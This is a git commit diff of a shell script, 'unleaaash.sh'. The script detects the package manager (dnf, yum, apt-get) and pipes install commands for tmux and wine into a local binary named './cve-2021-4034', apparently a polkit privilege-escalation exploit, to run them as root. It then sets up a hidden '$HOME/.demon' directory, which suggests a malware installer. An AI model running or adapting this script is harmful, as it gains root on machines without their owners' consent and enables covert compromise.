ced25db88bdc6ef1a49924c3b4dc50165897322a
Quentin Briand <91741405+QuentinBriand@users.noreply.github.com>
2022-01-31 23:34:37 +0100

    Update unleaaash.sh

--- unleaaash.sh
+++ unleaaash.sh
@@ -11,22 +11,31 @@ done
 make
 
 installer="..."
+flags="..."
 found=0
 tmux=1
 if [ command -v tmux &> /dev/null ]; then tmux=0; fi;
 if [ $found -eq 0 ] && command -v dnf &> /dev/null
 then
     installer="dnf"
+    flags="-qy"
     found=1
 fi
 if [ $found -eq 0 ] && command -v yum &> /dev/null
 then
     installer="yum"
+    flags="-qy"
+    found=1
+fi
+if [ $found -eq 0 ] && command -v apt-get &> /dev/null
+then
+    installer="apt-get"
+    flags="--assume-yes"
     found=1
 fi
 
-if [ $tmux -eq 1 ]; then echo "$installer install tmux -qy"; fi;
-echo "$installer install wine -qy" | ./cve-2021-4034
+if [ $tmux -eq 1 ]; then echo "$installer $flags install tmux"; fi;
+echo "$installer $flags install wine" | ./cve-2021-4034
 oldPWD=$PWD
 mkdir -p "$HOME/.demon"
 cd "$HOME/.demon"
